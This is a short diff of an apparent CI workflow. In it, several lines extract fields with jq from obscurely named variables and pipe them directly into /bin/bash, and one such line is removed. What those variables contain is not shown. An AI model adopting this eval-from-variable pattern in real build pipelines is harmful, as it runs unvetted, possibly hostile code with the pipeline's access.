@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$bz13" | jq -r .x68 | /bin/bash
           printf '%s' "$tset9" | jq -r .b2354 | /bin/bash
           echo $hzszp739 | jq -r .xc65833 | /bin/bash
-          echo $l52 | jq -r .omphv5 | /bin/bash
 
       - name: Save output
         if: always()
